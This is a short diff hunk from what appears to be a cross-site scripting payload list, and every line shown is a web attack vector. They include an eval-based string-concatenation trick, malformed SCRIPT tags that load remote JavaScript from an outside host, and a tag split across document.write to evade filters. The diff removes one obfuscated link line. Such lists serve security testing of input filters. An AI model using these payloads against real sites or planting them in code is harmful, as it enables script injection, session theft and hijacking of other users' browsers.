@@ -485,4 +485,3 @@ a="get";b="URL";c="javascript:";d="alert('XSS');";eval(a+b+c+d);
 <SCRIPT a=">" '' src="http://xss.ha.ckers.org/a.js"></SCRIPT>
 <SCRIPT "a='>'" src="http://xss.ha.ckers.org/a.js"></SCRIPT>
 <SCRIPT>document.write("<SCRI");</SCRIPT>PT src="http://xss.ha.ckers.org/a.js"></SCRIPT>
-<A href=http://www.gohttp://www.google.com/ogle.com/>link</A>
